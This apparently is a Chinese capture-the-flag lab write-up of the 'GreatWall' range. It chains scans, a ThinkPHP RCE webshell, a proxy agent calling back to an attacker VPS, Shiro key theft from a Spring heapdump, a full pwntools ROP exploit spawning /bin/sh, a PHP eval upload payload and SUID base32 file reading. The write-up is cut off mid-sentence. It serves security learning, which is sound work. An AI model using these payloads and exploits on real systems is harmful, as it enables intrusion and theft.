{"pageProps":{"postData":{"id":"春秋云镜GreatWall","contentHtml":"<h1>GreatWall</h1>\n<blockquote>\n<p><a href=\"https://yunjing.ichunqiu.com/major/detail/1171?type=2\">https://yunjing.ichunqiu.com/major/detail/1171?type=2</a></p>\n</blockquote>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image34.png\" alt=\"image.png\"></p>\n<p>8.130.146.145</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/greatwall  nmap -sT -min-rate 10000 -p- 8.130.146.145\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 08:56 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 8.130.146.145\nHost is up (0.012s latency).\nNot shown: 65530 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n25/tcp   open  smtp\n53/tcp   open  domain\n80/tcp   open  http\n110/tcp  open  pop3\n8080/tcp open  http-proxy\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 19.87 seconds\n</code></pre>\n<p>访问<code>HTTP</code>服务，并提取指纹</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image35.png\" alt=\"image.png\"></p>\n<p>访问<code>8080</code>端口，是管理页面</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image36.png\" alt=\"image.png\"></p>\n<h2>WEB渗透 - 1</h2>\n<p>手动测试了以下弱密码等方法，但是根本没有将数据传过去，使用<code>fscan</code>扫描一波</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  ./fscan_1.8.4 -h 8.130.146.145                                                                                                                                                                   \n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n8.130.146.145:8080 open\n8.130.146.145:80 open\n[*] alive ports len is: 2\nstart vulscan\n[*] WebTitle http://8.130.146.145      code:200 len:10887  title:\"\"\n[*] WebTitle http://8.130.146.145:8080 code:200 len:1027   title:Login Form\n[+] PocScan http://8.130.146.145:8080 poc-yaml-thinkphp5023-method-rce poc1\n已完成 2/2\n[*] 扫描结束,耗时: 23.801911592s\n</span></code></pre>\n<p>扫描出存在<code>ThinkPHP5</code>的RCE漏洞</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image37.png\" alt=\"image.png\"></p>\n<p>一键梭哈，点击<code>GETSHELL</code></p>\n<pre><code class=\"hljs language-bash\">[+] http://8.130.146.145:8080/peiqi.php   Pass:peiqi\n</code></pre>\n<p>使用<code>AntSword</code>连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image38.png\" alt=\"image.png\"></p>\n<p>在根目录下能找到<code>Flag1</code> （一开始以为要提权）</p>\n<pre><code class=\"hljs language-bash\">(www-data:/) $ <span class=\"hljs-built_in\">cat</span> f1ag01_UdEv.txt\nflag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}\n</code></pre>\n<h2>内网信息收集 - 1</h2>\n<p>得知内网网段<code>172.28.23.x</code></p>\n<pre><code class=\"hljs language-bash\">(www-data:/) $ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:16:3e:0c:c8:c0 brd ff:ff:ff:ff:ff:ff\n    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0\n       valid_lft 315358799sec preferred_lft 315358799sec\n    inet6 fe80::216:3eff:fe0c:c8c0/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>反弹<code>Shell</code>到<code>VPS</code>上，上传<code>fscan</code>进行扫描</p>\n<pre><code class=\"hljs language-bash\">www-data@portal:/var/www/html/background/public$ ./fscan -h 172.28.23.1/24\n./fscan -h 172.28.23.1/24                \n┌──────────────────────────────────────────────┐                   \n│    ___                              _        │                                                                                                                                                              \n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │                                                                                                                                                              \n│  / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;     │                                                 \n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │                                                                                                                                                              \n└──────────────────────────────────────────────┘                                                                                                                                                              \n      Fscan Version: 2.0.0                                    \n                                            \n[2025-03-29 21:20:50] [INFO] 暴力破解线程数: 1\n[2025-03-29 21:20:50] [INFO] 开始信息扫描\n[2025-03-29 21:20:50] [INFO] CIDR范围: 172.28.23.0-172.28.23.255              \n[2025-03-29 21:20:50] [INFO] 生成IP范围: 172.28.23.0.%!d(string=172.28.23.255) - %!s(MISSING).%!d(MISSING)\n[2025-03-29 21:20:50] [INFO] 解析CIDR 172.28.23.1/24 -> IP范围 172.28.23.0-172.28.23.255\n[2025-03-29 21:20:50] [INFO] 最终有效主机数量: 256\n[2025-03-29 21:20:50] [INFO] 开始主机扫描\n[2025-03-29 21:20:50] [INFO] 正在尝试无监听ICMP探测...\n[2025-03-29 21:20:50] [INFO] 当前用户权限不足,无法发送ICMP包\n[2025-03-29 21:20:50] [INFO] 切换为PING方式探测...            \n[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)\n[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.33    存活 (ICMP)\n[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.17    存活 (ICMP)\n[2025-03-29 21:20:57] [INFO] 存活主机数量: 3                  \n[2025-03-29 21:20:57] [INFO] 有效端口数量: 233\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.33:22                     \n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:22\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:21\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:80\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:22\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:80\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.33:8080\n[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:8080\n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.33:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]    \n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.26:22 => [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]    \n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.26:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]                                                                               \n[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.17:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.]      \n[2025-03-29 21:21:02] [SUCCESS] 服务识别 172.28.23.33:8080 => [http]\n[2025-03-29 21:21:02] [SUCCESS] 服务识别 172.28.23.17:8080 => [http]\n[2025-03-29 21:21:03] [SUCCESS] 服务识别 172.28.23.17:80 => [http]\n[2025-03-29 21:21:03] [SUCCESS] 服务识别 172.28.23.26:80 => [http]\n[2025-03-29 21:21:03] [INFO] 存活端口数量: 8                              \n[2025-03-29 21:21:03] [INFO] 开始漏洞扫描\n[2025-03-29 21:21:03] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle\n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=FB1FB63C9EC9F3C16B00B0127DA0965D                  \n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413                                            \n[2025-03-29 21:21:03] [SUCCESS] 匿名登录成功!   \n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:\"\"\n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form                                                                                                     \n[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=FB1FB63C9EC9F3C16B00B0127DA0965D 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆                                         \n[2025-03-29 21:21:04] [SUCCESS] 目标: http://172.28.23.17:8080\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1                              \n  详细信息:                              \n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n[2025-03-29 21:21:05] [SUCCESS] 目标: http://172.28.23.33:8080                                            \n  漏洞类型: poc-yaml-spring-actuator-heapdump-file                                      \n  漏洞名称:                                       \n  详细信息:                              \n        author:AgeloVito                              \n        links:https://www.cnblogs.com/wyb628/p/8567610.html \n[2025-03-29 21:21:05] [SUCCESS] 目标: http://172.28.23.33:8080\n  漏洞类型: poc-yaml-springboot-env-unauth                      \n  漏洞名称: spring2                                             \n  详细信息:                                                     \n        links:https://github.com/LandGrey/SpringBootVulExploit\n</span></code></pre>\n<p>三台存活主机：172.28.23.26，172.28.23.33，172.28.23.17</p>\n<p>并且<code>172.28.23.33</code>存在公开漏洞，可进行利用</p>\n<h2>一层代理搭建</h2>\n<p>使用<code>stowaway</code></p>\n<pre><code class=\"hljs language-bash\">./linux_x64_admin -l 2087 -s 12\n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@portal:/var/www/html/background/public$ ./linux_x64_agent -c &#x3C;VPS-ip>:2087 -s 123 --reconnect 8                                                                                                 \n&#x3C;64_agent -c &#x3C;VPS-ip>:2087 -s 123 --reconnect 8\n2025/03/29 21:32:51 [*] Starting agent node actively.Connecting to &#x3C;VPS-ip>:2087.Reconnecting every 8 seconds                                                                                            \n</code></pre>\n<p>在服务端设置<code>socks</code>代理</p>\n<pre><code class=\"hljs language-bash\">(admin) >> detail\nNode[0] -> IP: 8.130.146.145:46344  Hostname: portal  User: www-data\nMemo: \n\n(admin) >> use 0\n(node 0) >> socks 8080 admin admin\n[*] Trying to listen on 0.0.0.0:8080......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Socks start successfully!\n</span></code></pre>\n<p>进行测试，配置好<code>proxychains</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  proxychains4 curl http://172.28.23.33:8080/login                 \n[proxychains] config file found: /etc/proxychains4.conf                                                           \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n[proxychains] Strict chain  ...  &#x3C;VPS-ip>:1080  ...  172.28.23.33:8080  ...  OK\n&#x3C;!DOCTYPE html PUBLIC <span class=\"hljs-string\">\"-//W3C//DTD XHTML 1.0 Transitional//EN\"</span> <span class=\"hljs-string\">\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"</span>>\n&#x3C;html xmlns=<span class=\"hljs-string\">\"http://www.w3.org/1999/xhtml\"</span>>\n&#x3C;<span class=\"hljs-built_in\">head</span>>                  \n  &#x3C;meta http-equiv=<span class=\"hljs-string\">\"Content-Type\"</span> content=<span class=\"hljs-string\">\"text/html; charset=utf-8\"</span> />\n  &#x3C;title>智联科技 ERP 后台登陆&#x3C;/title>           \n  &#x3C;<span class=\"hljs-built_in\">link</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/css\"</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"/css/common.css\"</span> />\n  &#x3C;<span class=\"hljs-built_in\">link</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/css\"</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"/css/style.css\"</span> />\n  &#x3C;<span class=\"hljs-built_in\">link</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/css\"</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"/css/login.css\"</span> />\n  .....\n</code></pre>\n<p>搭建成功</p>\n<h2>172.28.23.33 - ERP</h2>\n<h3>spring-actuator-heapdump</h3>\n<p><code>172.28.23.33:8080</code> 有公开漏洞 <code>poc-yaml-spring-actuator-heapdump-file</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image39.png\" alt=\"image.png\"></p>\n<p>将<code>heapdump</code> 文件下载下来</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  proxychains4 wget http://172.28.23.33:8080/actuator/heapdump\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n--2025-03-29 09:50:18--  http://172.28.23.33:8080/actuator/heapdump\n正在连接 172.28.23.33:8080... [proxychains] Strict chain  ...  &#x3C;VPS-ip>:1080  ...  172.28.23.33:8080  ...  OK\n已连接。\n已发出 HTTP 请求，正在等待回应... 200 \n长度：28261428 (27M) [application/octet-stream]\n正在保存至: “heapdump”\n\nheapdump                                                 100%[==================================================================================================================================>]  26.95M  6.20MB/s  用时 4.0s    \n\n2025-03-29 09:50:23 (6.77 MB/s) - 已保存 “heapdump” [28261428/28261428])\n</code></pre>\n<p>使用<code>JDumpSpider</code>来读取敏感信息</p>\n<p>工具链接：<a href=\"https://github.com/whwlsfb/JDumpSpider\">https://github.com/whwlsfb/JDumpSpider</a></p>\n<p>可以读到<code>Shiro</code>的信息，并将其密钥读出来了</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/greatwall  java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                     \n===========================================                                                                                                                                                                                         \nCookieRememberMeManager(ShiroKey)                                                                                                                                                                                                   \n-------------                                                                                                                                                                                                                       \nalgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES                                                                                                                                                                        \n</code></pre>\n<p>工具梭哈</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image40.png\" alt=\"image.png\"></p>\n<p>注入内存马</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image41.png\" alt=\"image.png\"></p>\n<p>使用冰蝎进行连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image42.png\" alt=\"image.png\"></p>\n<h3>59696 端口</h3>\n<p>在根目录下没找到<code>flag</code>文件，应该是要提权了</p>\n<p>开启了一个很奇怪的端口<code>59696</code></p>\n<pre><code class=\"hljs language-bash\">/ >ss -tulpn\n\nNetid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process \nudp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            \nudp   UNCONN 0      0       172.28.23.33%eth0:68           0.0.0.0:*            \nudp   UNCONN 0      0               127.0.0.1:323          0.0.0.0:*            \nudp   UNCONN 0      0                   [::1]:323             [::]:*            \ntcp   LISTEN 0      64                0.0.0.0:59696        0.0.0.0:*            \ntcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            \ntcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            \ntcp   LISTEN 0      100                     *:8080               *:*     <span class=\"hljs-built_in\">users</span>:((\"java\",pid=<span class=\"hljs-number\">667</span>,fd=<span class=\"hljs-number\">27</span>))\n</code></pre>\n<p>需要进行验证</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q nc 172.28.23.33 59696\nConnection established!\nServer <span class=\"hljs-keyword\">time</span>: Sat Mar 29 22:10:58 2025\n\nUsername: 1\nPassword: 2\n\nUnauthorized\n</code></pre>\n<p>在用户家目录发现<code>HashNote</code>，就是<code>59696</code>端口运行的程序</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image43.png\" alt=\"image.png\"></p>\n<p>下载，使用<code>IDA</code>分析，不会逆向</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image44.png\" alt=\"image.png\"></p>\n<p>查看WP，得知是PWN（这些我是真的菜）</p>\n<p>exp 如下（<a href=\"https://www.dr0n.top/posts/f249db01/#%E6%99%BA%E8%81%94%E7%A7%91%E6%8A%80-ERP-172-28-23-33\">https://www.dr0n.top/posts/f249db01/#智联科技-ERP-172-28-23-33</a>）：</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\ncontext.arch=<span class=\"hljs-string\">'amd64'</span>\n\ndef add(key,data=<span class=\"hljs-string\">'b'</span>):\n    p.sendlineafter(b<span class=\"hljs-string\">'Option:'</span>,b<span class=\"hljs-string\">'1'</span>)\n    p.sendlineafter(b<span class=\"hljs-string\">'Key:'</span>,key)\n    p.sendlineafter(b<span class=\"hljs-string\">'Data:'</span>,data)\n\ndef show(key):\n    p.sendlineafter(b<span class=\"hljs-string\">'Option:'</span>,b<span class=\"hljs-string\">'2'</span>)\n    p.sendlineafter(b<span class=\"hljs-string\">\"Key: \"</span>,key);\n\ndef edit(key,data):\n    p.sendlineafter(b<span class=\"hljs-string\">'Option:'</span>,b<span class=\"hljs-string\">'3'</span>)\n    p.sendlineafter(b<span class=\"hljs-string\">'Key:'</span>,key)\n    p.sendlineafter(b<span class=\"hljs-string\">'Data:'</span>,data)\n\ndef name(username):\n    p.sendlineafter(b<span class=\"hljs-string\">'Option:'</span>,b<span class=\"hljs-string\">'4'</span>)\n    p.sendlineafter(b<span class=\"hljs-string\">'name:'</span>,username)\n\np = remote(<span class=\"hljs-string\">'172.28.23.33'</span>, 59696)\n<span class=\"hljs-comment\"># p = process('./HashNote')</span>\n\nusername=0x5dc980\nstack=0x5e4fa8\nukey=b<span class=\"hljs-string\">'\\x30'</span>*5+b<span class=\"hljs-string\">'\\x31'</span>+b<span class=\"hljs-string\">'\\x44'</span>\n\nfake_chunk=flat({\n    0:username+0x10,\n    0x10:[username+0x20,len(ukey),\\\n        ukey,0],\n    0x30:[stack,0x10]\n    },filler=b<span class=\"hljs-string\">'\\x00'</span>)\n\np.sendlineafter(b<span class=\"hljs-string\">'name'</span>,fake_chunk)\np.sendlineafter(b<span class=\"hljs-string\">'word'</span>,<span class=\"hljs-string\">'freep@ssw0rd:3'</span>)\n\nadd(b<span class=\"hljs-string\">'\\x30'</span>*1+b<span class=\"hljs-string\">'\\x31'</span>+b<span class=\"hljs-string\">'\\x44'</span>,b<span class=\"hljs-string\">'test'</span>)   <span class=\"hljs-comment\"># 126</span>\nadd(b<span class=\"hljs-string\">'\\x30'</span>*2+b<span class=\"hljs-string\">'\\x31'</span>+b<span class=\"hljs-string\">'\\x44'</span>,b<span class=\"hljs-string\">'test'</span>)   <span class=\"hljs-comment\"># 127</span>\n\nshow(ukey)\nmain_ret=u64(p.read(8))-0x1e0\n\nrdi=0x0000000000405e7c <span class=\"hljs-comment\"># pop rdi ; ret</span>\nrsi=0x000000000040974f <span class=\"hljs-comment\"># pop rsi ; ret</span>\nrdx=0x000000000053514b <span class=\"hljs-comment\"># pop rdx ; pop rbx ; ret</span>\nrax=0x00000000004206ba <span class=\"hljs-comment\"># pop rax ; ret</span>\nsyscall=0x00000000004560c6 <span class=\"hljs-comment\"># syscall</span>\n\nfake_chunk=flat({\n    0:username+0x20,\n    0x20:[username+0x30,len(ukey),\\\n        ukey,0],\n    0x40:[main_ret,0x100,b<span class=\"hljs-string\">'/bin/sh\\x00'</span>]\n    },filler=b<span class=\"hljs-string\">'\\x00'</span>)\n\nname(fake_chunk.ljust(0x80,b<span class=\"hljs-string\">'\\x00'</span>))\n\npayload=flat([\n    rdi,username+0x50,\n    rsi,0,\n    rdx,0,0,\n    rax,0x3b,\n    syscall\n    ])\n\np.sendlineafter(b<span class=\"hljs-string\">'Option:'</span>,b<span class=\"hljs-string\">'3'</span>)\np.sendlineafter(b<span class=\"hljs-string\">'Key:'</span>,ukey)\np.sendline(payload)\np.sendlineafter(b<span class=\"hljs-string\">'Option:'</span>,b<span class=\"hljs-string\">'9'</span>)\np.interactive()\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pycryptodome)  ⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q python exp.py\n[+] Opening connection to 172.28.23.33 on port 59696: Done\n/root/Desktop/test/greatwall/exp.py:39: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  p.sendlineafter(b<span class=\"hljs-string\">'word'</span>,<span class=\"hljs-string\">'freep@ssw0rd:3'</span>)\n[*] Switching to interactive mode\n Invalid!$  \n</code></pre>\n<p><code>root</code>目录下存在<code>flag03</code></p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">cat</span> f1ag03.txt\nflag03: flag{6a326f94-6526-4586-8233-152d137281fd}\n</code></pre>\n<h2>172.28.23.26 - 新翔OA</h2>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image45.png\" alt=\"image.png\"></p>\n<p>之前<code>fscan</code>扫描的时候<code>FTP</code>是可以进行匿名登陆的</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q ftp 172.28.23.26\nConnected to 172.28.23.26.\n220 (vsFTPd 3.0.3)\nName (172.28.23.26:root): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system <span class=\"hljs-built_in\">type</span> is UNIX.\nUsing binary mode to transfer files.\n-rw-r--r--    1 0        0         7536672 Mar 23  2024 OASystem.zip\n226 Directory send OK.\nftp> mget *\nmget OASystem.zip [anpqy?]? <span class=\"hljs-built_in\">yes</span>\n229 Entering Extended Passive Mode (|||38378|)\n150 Opening BINARY mode data connection <span class=\"hljs-keyword\">for</span> OASystem.zip (7536672 bytes).\n100% |***************************************************************************************************************************************************************************************|  7360 KiB    1.67 MiB/s    00:00 ETA\n226 Transfer complete.\n7536672 bytes received <span class=\"hljs-keyword\">in</span> 00:04 (1.67 MiB/s)\n</code></pre>\n<p>得到一个压缩包<code>OASystem.zip</code> 应该是要进行代码审计了（悲，心疼沙砾）</p>\n<p>先不代码审计，通过搜索引擎来搜索公开漏洞，能找到在前台有个任意文件上传漏洞</p>\n<p>漏洞出现在<code>uploadbase64.php</code>中：</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/greatwall/OAsystem  <span class=\"hljs-built_in\">cat</span> uploadbase64.php \n&#x3C;?php\n/**\n * Description: PhpStorm.\n * Author: yoby\n * DateTime: 2018/12/4 18:01\n * Email:logove@qq.com\n * Copyright Yoby版权所有\n */\n<span class=\"hljs-variable\">$img</span> = <span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'imgbase64'</span>];\n<span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">'/^(data:\\s*image\\/(\\w+);base64,)/'</span>, <span class=\"hljs-variable\">$img</span>, <span class=\"hljs-variable\">$result</span>)) {\n    <span class=\"hljs-variable\">$type</span> = <span class=\"hljs-string\">\".\"</span>.<span class=\"hljs-variable\">$result</span>[2];\n    <span class=\"hljs-variable\">$path</span> = <span class=\"hljs-string\">\"upload/\"</span> . <span class=\"hljs-built_in\">date</span>(<span class=\"hljs-string\">\"Y-m-d\"</span>) . <span class=\"hljs-string\">\"-\"</span> . uniqid() . <span class=\"hljs-variable\">$type</span>;\n}\n<span class=\"hljs-variable\">$img</span> =  base64_decode(str_replace(<span class=\"hljs-variable\">$result</span>[1], <span class=\"hljs-string\">''</span>, <span class=\"hljs-variable\">$img</span>));\n@file_put_contents(<span class=\"hljs-variable\">$path</span>, <span class=\"hljs-variable\">$img</span>);\n<span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-string\">'{\"src\":\"'</span>.<span class=\"hljs-variable\">$path</span>.<span class=\"hljs-string\">'\"}'</span>);#    \n</code></pre>\n<p>只需满足<code>preg_match</code>条件就能上传，而且参数可控</p>\n<p>payload：</p>\n<pre><code class=\"hljs language-bash\">data:image/php;<span class=\"hljs-built_in\">base64</span>,PD9waHAgQGV2YWwoJF9QT1NUWycxJ10pOw==\n</code></pre>\n<p>通过最后解码能解码成一句话木马<code>&#x3C;?php @eval($_POST['1']);</code></p>\n<p>梭哈！</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image46.png\" alt=\"image.png\"></p>\n<p>测试一下木马是否能正常使用，正常</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image47.png\" alt=\"image.png\"></p>\n<p>AntSword连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image48.png\" alt=\"image.png\"></p>\n<p>在根目录能找到<code>flag02</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image49.png\" alt=\"image.png\"></p>\n<p>但是发现不能读取，进到虚拟终端，发现回显都是<code>ret=127</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image50.png\" alt=\"image.png\"></p>\n<p>这是被**<code>Disable Functions</code>** 给限制了</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image51.png\" alt=\"image.png\"></p>\n<p>刚好 AntSword 的插件能绕过<code>Disable Functions</code> 的限制</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image52.png\" alt=\"image.png\"></p>\n<p>我们在重新连接到插件上传的新马，但是测试连接时出现了返回数据为空</p>\n<p>最后通过**<code>Backtrace UAF</code>** 能直接获得shell</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/image53.png\" alt=\"image.png\"></p>\n<p>直接读取<code>flag02</code>发现还是不能读取，查看权限</p>\n<pre><code class=\"hljs language-bash\">(www-data:/) $ <span class=\"hljs-built_in\">ls</span> -al flag02.txt\n-r--------   1 root root    51 Mar 14  2024 flag02.txt\n</code></pre>\n<p>发现需要提权，寻找<code>SUID</code>权限文件</p>\n<pre><code class=\"hljs language-bash\">(www-data:/) $ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/bin/fusermount\n/bin/ping6\n/bin/mount\n/bin/su\n/bin/ping\n/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/at\n/usr/bin/staprun\n/usr/bin/base32\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/s-nail/s-nail-privsep\n</code></pre>\n<p>发现<code>/usr/bin/base32</code> ，像是可以将文件以<code>base32</code>输出，尝试执行</p>\n<pre><code class=\"hljs language-bash\">(www-data:/) $ /usr/bin/base32 /flag02.txt\nMZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRD\nEOD5BI======\n</code></pre>\n<p><code>base32</code>解码得到<code>flag02</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/greatwall/OAsystem  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"MZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRDEOD5BI======\"</span> | <span class=\"hljs-built_in\">base32</span> -d\nflag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}\n</code></pre>\n<p>这里想要进行反弹 <code>shell</code> ，但是发现通过<code>Backtrace UAF</code> 